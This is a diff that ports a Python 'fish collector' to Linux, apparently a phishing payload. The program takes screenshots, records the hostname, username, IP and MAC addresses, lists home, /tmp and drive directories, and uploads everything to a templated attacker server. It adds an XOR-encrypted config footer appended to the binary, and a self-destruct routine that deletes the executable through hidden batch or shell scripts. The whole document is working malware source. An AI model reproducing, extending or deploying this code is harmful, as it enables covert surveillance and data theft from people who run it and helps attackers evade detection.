@@ -2,9 +2,7 @@ import socket
 import os
 import json
 import uuid
-import ctypes
 import sys
-import re
 import subprocess
 from datetime import datetime
 
@@ -12,17 +10,59 @@ from datetime import datetime
 SERVER_URL = "{{SERVER_URL}}"
 TOKEN = "{{TOKEN}}"
 SELF_DESTRUCT = "{{SELF_DESTRUCT}}"       # "true" or "false"
-POPUP_ENABLED = "{{POPUP_ENABLED}}"         # "true" or "false"
-POPUP_MESSAGE = "{{POPUP_MESSAGE}}"         # popup text after execution
+POPUP_ENABLED = "{{POPUP_ENABLED}}"       # "true" or "false"
+POPUP_MESSAGE = "{{POPUP_MESSAGE}}"       # popup text after execution
 # ------------------------------------------
 
-if sys.platform != 'win32':
-    print("This tool is designed for Windows only.")
-    sys.exit(1)
+
+FOOTER_KEY = b'fishfish@aes'
 
 
-def get_network_info():
+def _xor(data, key):
+    """XOR encrypt/decrypt data with a repeating key."""
+    key_len = len(key)
+    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))
+
+
+def _load_footer_config():
+    """Read XOR-encrypted JSON config from a footer appended to this binary.
+    Used when the binary is produced by copy+append on Linux,
+    rather than PyInstaller embed on Windows."""
+    try:
+        exe_path = os.path.abspath(sys.argv[0])
+        with open(exe_path, 'rb') as f:
+            f.seek(-1024, 2)  # last 1KB
+            tail = f.read()
+        marker = b'---FISHCFG---'
+        start = tail.find(marker)
+        if start >= 0:
+            end = tail.find(marker, start + len(marker))
+            if end >= 0:
+                encrypted = tail[start + len(marker):end]
+                decrypted = _xor(encrypted, FOOTER_KEY)
+                cfg = json.loads(decrypted.decode('utf-8'))
+                return cfg
+    except Exception:
+        pass
+    return None
+
+
+_footer_cfg = _load_footer_config()
+if _footer_cfg:
+    SERVER_URL = _footer_cfg.get('server_url', SERVER_URL)
+    TOKEN = _footer_cfg.get('token', TOKEN)
+    SELF_DESTRUCT = 'true' if _footer_cfg.get('self_destruct') else 'false'
+    POPUP_ENABLED = 'true' if _footer_cfg.get('popup_enabled', True) else 'false'
+    POPUP_MESSAGE = _footer_cfg.get('popup_message', POPUP_MESSAGE)
+
+IS_WINDOWS = sys.platform == 'win32'
+
+
+# ---- Network Info ----
+
+def _get_network_info_windows():
     """Get per-adapter IP + MAC pairs using Windows API."""
+    import ctypes
     result = []
 
     MAX_ADAPTER_NAME = 256
@@ -86,19 +126,93 @@ def get_network_info():
     return result
 
 
-def take_screenshot_pil():
-    """Preferred screenshot method using PIL."""
+def _get_network_info_linux():
+    """Get per-interface IP + MAC pairs on Linux using /sys/class/net."""
+    import fcntl
+    import struct
+    result = []
+    net_dir = '/sys/class/net'
+    if not os.path.exists(net_dir):
+        return result
+
+    for iface in sorted(os.listdir(net_dir)):
+        if iface == 'lo':
+            continue
+        # MAC address
+        mac_path = os.path.join(net_dir, iface, 'address')
+        mac = ''
+        try:
+            with open(mac_path, 'r') as f:
+                mac = f.read().strip().upper()
+        except Exception:
+            pass
+        # IP address via ioctl
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            ip = socket.inet_ntoa(
+                fcntl.ioctl(sock.fileno(), 0x8915,  # SIOCGIFADDR
+                            struct.pack('256s', iface[:15].encode()))[20:24]
+            )
+            sock.close()
+        except Exception:
+            ip = ''
+        if ip and ip != '127.0.0.1':
+            result.append({'ip': ip, 'mac': mac})
+
+    return result
+
+
+def get_network_info():
+    if IS_WINDOWS:
+        return _get_network_info_windows()
+    return _get_network_info_linux()
+
+
+# ---- Screenshot ----
+
+def take_screenshot():
+    """Take a screenshot. Platform-specific methods with fallbacks."""
+    import io as io_mod
+
+    if IS_WINDOWS:
+        try:
+            from PIL import ImageGrab
+            img = ImageGrab.grab(all_screens=True)
+            buf = io_mod.BytesIO()
+            img.save(buf, format='JPEG', quality=60)
+            buf.seek(0)
+            return buf
+        except Exception:
+            return None
+
+    # Linux: try import (ImageMagick), then scrot, then xdg-desktop-portal
+    methods = [
+        ['import', '-window', 'root', '-strip', 'jpg:-'],
+        ['scrot', '-', '-t', '0'],
+    ]
+    for method in methods:
+        try:
+            proc = subprocess.run(method, capture_output=True, timeout=15)
+            if proc.returncode == 0 and proc.stdout:
+                return io_mod.BytesIO(proc.stdout)
+        except Exception:
+            continue
+
+    # Last resort: try PIL+pyscreenshot
     try:
-        from PIL import ImageGrab
-        import io as io_mod
-        img = ImageGrab.grab(all_screens=True)
+        import pyscreenshot
+        img = pyscreenshot.grab()
         buf = io_mod.BytesIO()
         img.save(buf, format='JPEG', quality=60)
         buf.seek(0)
         return buf
     except Exception:
-        return None
+        pass
 
+    return None
+
+
+# ---- Directory Scanning ----
 
 def scan_directory(path, max_depth=1, max_files=500):
     """Scan a directory and return a tree structure."""
@@ -107,9 +221,13 @@ def scan_directory(path, max_depth=1, max_files=500):
         result['error'] = 'path not found'
         return result
 
-    skip_dirs = {'$Recycle.Bin', 'System Volume Information', 'Windows',
-                 'Program Files', 'Program Files (x86)', 'ProgramData',
-                 'Config.Msi', 'Recovery', 'MSOCache', 'PerfLogs'}
+    if IS_WINDOWS:
+        skip_dirs = {'$Recycle.Bin', 'System Volume Information', 'Windows',
+                     'Program Files', 'Program Files (x86)', 'ProgramData',
+                     'Config.Msi', 'Recovery', 'MSOCache', 'PerfLogs'}
+    else:
+        skip_dirs = {'proc', 'sys', 'dev', 'run', 'snap', 'lost+found',
+                     '/proc', '/sys', '/dev', '/run'}
 
     result['exists'] = True
     file_count = 0
@@ -123,7 +241,6 @@ def scan_directory(path, max_depth=1, max_files=500):
             rel_root = os.path.relpath(root, path)
 
             if depth == 0:
-                # Root level: dirs go into tree as folders
                 for d in sorted(dirs):
                     result['tree'].append({'type': 'dir', 'name': d, 'children': []})
                 for f in sorted(files):
@@ -137,7 +254,6 @@ def scan_directory(path, max_depth=1, max_files=500):
                     })
                     file_count += 1
             else:
-                # Subdirectory: add children to parent dir node
                 parent_name = rel_root.split(os.sep, 1)[0] if os.sep in rel_root else rel_root
                 parent = next((d for d in result['tree'] if d['type'] == 'dir' and d['name'] == parent_name), None)
                 if parent:
@@ -163,25 +279,28 @@ def scan_directory(path, max_depth=1, max_files=500):
 
 
 def scan_target_directories():
-    """Scan desktop files, C: drive, D: drive."""
-    user_profile = os.environ.get('USERPROFILE', '')
+    """Scan user's home directory on Linux, or Desktop/C:/D: on Windows."""
     results = {}
 
-    # Desktop
-    if user_profile:
-        desktop_path = os.path.join(user_profile, 'Desktop')
-        results['Desktop'] = scan_directory(desktop_path)
-
-    # C: drive root
-    if os.path.exists('C:/'):
-        results['C_drive'] = scan_directory('C:/')
-
-    # D: drive root
-    if os.path.exists('D:/'):
-        results['D_drive'] = scan_directory('D:/')
+    if IS_WINDOWS:
+        user_profile = os.environ.get('USERPROFILE', '')
+        if user_profile:
+            desktop_path = os.path.join(user_profile, 'Desktop')
+            results['Desktop'] = scan_directory(desktop_path)
+        if os.path.exists('C:/'):
+            results['C_drive'] = scan_directory('C:/')
+        if os.path.exists('D:/'):
+            results['D_drive'] = scan_directory('D:/')
+    else:
+        home = os.path.expanduser('~')
+        results['Home'] = scan_directory(home)
+        if os.path.exists('/tmp'):
+            results['tmp'] = scan_directory('/tmp')
 
     return results
 
+
+# ---- Data Sending ----
 
 def send_data(data, screenshot_bytes):
     """Send collected data and screenshot to server."""
@@ -225,51 +344,98 @@ def send_data(data, screenshot_bytes):
         return None
 
 
+# ---- Self-Destruct ----
+
+def _self_destruct_windows():
+    """Windows: batch script deletes EXE after process exits."""
+    import ctypes
+    exe_path = os.path.abspath(sys.argv[0])
+    if not exe_path.lower().endswith('.exe'):
+        return
+    dir_name = os.path.dirname(exe_path)
+    random_name = uuid.uuid4().hex[:12]
+    fake_path = os.path.join(dir_name, random_name)
+    with open(fake_path, 'wb') as f:
+        f.write(b'')
+
+    bat_path = os.path.join(os.environ.get('TEMP', '.'), f'_c{uuid.uuid4().hex[:6]}.bat')
+    with open(bat_path, 'w') as f:
+        f.write(f'@echo off\r\n'
+                f':loop\r\n'
+                f'del /f "{exe_path}" >nul 2>&1\r\n'
+                f'if exist "{exe_path}" (\r\n'
+                f'    timeout /t 1 /nobreak >nul\r\n'
+                f'    goto loop\r\n'
+                f')\r\n'
+                f'del "%~f0" >nul 2>&1\r\n')
+
+    subprocess.Popen(
+        ['cmd.exe', '/c', bat_path],
+        creationflags=0x08000000,
+        close_fds=True,
+    )
+    print(f"[*] Self-destruct: {exe_path} -> {fake_path}")
+
+
+def _self_destruct_linux():
+    """Linux: shell script deletes binary after process exits, leaves zero-byte file."""
+    import stat
+    exe_path = os.path.abspath(sys.argv[0])
+    dir_name = os.path.dirname(exe_path)
+    random_name = uuid.uuid4().hex[:12]
+    fake_path = os.path.join(dir_name, random_name)
+    with open(fake_path, 'wb') as f:
+        f.write(b'')
+
+    # Shell script that waits for parent PID to exit, then deletes the binary
+    cleanup = os.path.join('/tmp', f'_c{uuid.uuid4().hex[:6]}.sh')
+    pid = os.getpid()
+    with open(cleanup, 'w') as f:
+        f.write(f'#!/bin/sh\n'
+                f'while kill -0 {pid} 2>/dev/null; do sleep 1; done\n'
+                f'rm -f "{exe_path}"\n'
+                f'rm -f "$0"\n')
+    os.chmod(cleanup, stat.S_IRWXU)
+    subprocess.Popen([cleanup], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                     close_fds=True, start_new_session=True)
+    print(f"[*] Self-destruct: {exe_path} -> {fake_path}")
+
+
 def self_destruct():
-    """Replace this EXE with a zero-byte file, then delete the EXE after exit."""
     try:
-        # PyInstaller onefile: sys.executable points to temp dir, use sys.argv[0]
-        exe_path = os.path.abspath(sys.argv[0])
-        if not exe_path.lower().endswith('.exe'):
-            return
-        dir_name = os.path.dirname(exe_path)
-
-        # Write a zero-byte placeholder without extension
-        random_name = uuid.uuid4().hex[:12]
-        fake_path = os.path.join(dir_name, random_name)
-        with open(fake_path, 'wb') as f:
-            f.write(b'')
-
-        # Batch script to delete the EXE after this process exits
-        # It loops until the EXE file is unlocked, then deletes itself
-        bat_path = os.path.join(os.environ.get('TEMP', '.'), f'_c{uuid.uuid4().hex[:6]}.bat')
-        with open(bat_path, 'w') as f:
-            f.write(f'@echo off\r\n'
-                    f':loop\r\n'
-                    f'del /f "{exe_path}" >nul 2>&1\r\n'
-                    f'if exist "{exe_path}" (\r\n'
-                    f'    timeout /t 1 /nobreak >nul\r\n'
-                    f'    goto loop\r\n'
-                    f')\r\n'
-                    f'del "%~f0" >nul 2>&1\r\n')
-
-        subprocess.Popen(
-            ['cmd.exe', '/c', bat_path],
-            creationflags=0x08000000,  # CREATE_NO_WINDOW
-            close_fds=True,
-        )
-        print(f"[*] Self-destruct: {exe_path} -> {fake_path}")
+        if IS_WINDOWS:
+            _self_destruct_windows()
+        else:
+            _self_destruct_linux()
     except Exception as e:
         print(f"[!] Self-destruct failed: {e}")
 
 
-def show_popup():
-    """Show a message box with configured text."""
-    try:
-        ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, '提示', 0x30)  # MB_ICONWARNING
-    except Exception:
-        pass
+# ---- Popup ----
 
+def show_popup():
+    """Show a message box / notification with configured text."""
+    if IS_WINDOWS:
+        try:
+            import ctypes
+            ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, '提示', 0x30)
+        except Exception:
+            pass
+    else:
+        # Try zenity (GUI), then notify-send (desktop notification)
+        for method in (
+            ['zenity', '--warning', '--text', POPUP_MESSAGE],
+            ['notify-send', POPUP_MESSAGE],
+        ):
+            try:
+                subprocess.run(method, timeout=5,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                break
+            except Exception:
+                continue
+
+
+# ---- Main ----
 
 def main():
     print("[*] Starting fish collector...")
@@ -277,9 +443,11 @@ def main():
     print(f"[*] Server: {SERVER_URL}")
 
     hostname = socket.gethostname()
-    username = os.environ.get('USERNAME', 'unknown')
+    if IS_WINDOWS:
+        username = os.environ.get('USERNAME', 'unknown')
+    else:
+        username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
 
-    # Per-adapter IP + MAC
     net_info = get_network_info()
     ip_list = '\n'.join(f"{ni['ip']}  ({ni['mac']})" for ni in net_info)
 
@@ -287,16 +455,15 @@ def main():
     print(f"[*] Username: {username}")
     print(f"[*] Network:\n{ip_list}")
 
-    # Take screenshot
     print("[*] Taking screenshot...")
-    screenshot_bytes = take_screenshot_pil()
+    screenshot_bytes = take_screenshot()
     if screenshot_bytes:
-        print(f"[*] Screenshot captured ({screenshot_bytes.getbuffer().nbytes} bytes)")
+        size = screenshot_bytes.getbuffer().nbytes if hasattr(screenshot_bytes, 'getbuffer') else len(screenshot_bytes.getvalue())
+        print(f"[*] Screenshot captured ({size} bytes)")
     else:
         print("[!] Screenshot failed")
 
-    # Scan directories
-    print("[*] Scanning directories (Desktop, C:\, D:\)...")
+    print(f"[*] Scanning directories...")
     dir_info = scan_target_directories()
 
     data = {
@@ -316,11 +483,9 @@ def main():
     else:
         print("[!] Failed to send data")
 
-    # Show popup if enabled
     if POPUP_ENABLED.lower() == 'true':
         show_popup()
 
-    # Self-destruct if configured
     if SELF_DESTRUCT.lower() == 'true':
         self_destruct()
 
